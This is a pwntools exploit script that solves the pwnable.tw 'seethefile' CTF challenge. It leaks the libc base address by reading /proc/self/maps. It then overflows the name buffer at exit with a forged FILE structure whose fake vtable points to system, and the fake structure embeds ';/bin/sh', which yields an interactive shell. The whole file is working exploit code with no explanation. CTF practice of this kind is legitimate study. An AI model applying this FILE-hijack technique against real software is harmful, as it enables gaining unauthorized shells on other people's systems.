from pwn import *

e = ELF("./seethefile")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("chall.pwnable.tw", 10200)

context.log_level="debug"
gdb.attach(p, """break * main+216""")


def open_file(n):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", n)


def read_file():
    p.sendlineafter(":", "2")
    

def write_file():
    p.sendlineafter(":", "3")
    

def close_file():
    p.sendlineafter(":", "4")
    

def exit_out(n):
    p.sendlineafter(":", "5")
    p.sendlineafter(":", n)


open_file("/proc/self/maps")

read_file()

write_file()

read_file()

write_file()



p.recvuntil("libc")
p.recvuntil("f7")
libc.address = int("f7"+p.recv(6).strip(), 16) - 0x1ad000


print("libc base", hex(libc.address))



close_file()






name_addr = 0x0804b260




#generated_vtable = ''.join(p64(i) for i in vtable)

name_filler = "\x00"*16 + p32(libc.sym["system"])

name_filler = name_filler.ljust(32, "\x00")


f_obj = "\x01\x01;/bin/sh"

f_obj += p8(0)*2
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)

f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)

f_obj += p32(0)

f_obj += p32(0)
f_obj += p32(0)

f_obj += p32(0x0804bf01)

f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)

f_obj += p32(0)

f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)
f_obj += p32(0)

f_obj += p32(name_addr+48+len(f_obj)+8)




print("exit@libc", hex(libc.sym["exit"]))
print("system@libc", hex(libc.sym["system"]))
print("fclose@libc", hex(libc.sym["fclose"]))





exit_out(name_filler + p64(name_addr+48) + p64(0x4141414141414141) + f_obj + p32(0) + "A"*28 + p32(name_addr+16-8))








p.interactive()






